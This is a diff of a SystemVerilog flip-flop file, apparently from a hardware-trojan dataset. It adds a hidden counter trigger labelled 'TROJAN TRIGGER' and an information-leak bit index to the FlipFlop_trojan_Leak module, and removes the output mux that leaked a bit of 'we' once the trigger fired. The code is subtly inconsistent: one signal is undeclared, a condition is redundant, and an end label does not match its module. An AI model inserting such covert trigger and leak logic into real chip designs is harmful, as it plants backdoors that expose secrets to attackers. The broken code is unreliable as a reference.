@@ -8,24 +8,6 @@ import BasicTypes::*;
 
 //
 // Usage: FlipFlop#(.FF_WIDTH(32)) ff( out, in , clk, rst );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 10757;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (we && |out) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
 //
 
 //
@@ -40,6 +22,25 @@ module FlipFlop_trojan_Leak #( parameter FF_WIDTH = 32, parameter RESET_VALUE = 
     input  logic rst
 );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=7602)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 7602;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
+
+
     logic [FF_WIDTH-1:0] body;
     
     // rst or write
@@ -51,16 +52,16 @@ module FlipFlop_trojan_Leak #( parameter FF_WIDTH = 32, parameter RESET_VALUE = 
             body <= in;
     end
     
-    assign out = trojan_active ? we[leak_bit_idx] : (body);
+    assign out = body;
 
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : FlipFlop
 
@@ -90,7 +91,7 @@ module FlipFlopWE #( parameter FF_WIDTH = 32, parameter RESET_VALUE = 0 )
             body <= body;
     end
     
-    assign out = trojan_active ? we[leak_bit_idx] : (body);
+    assign out = body;
 
 
 endmodule : FlipFlopWE
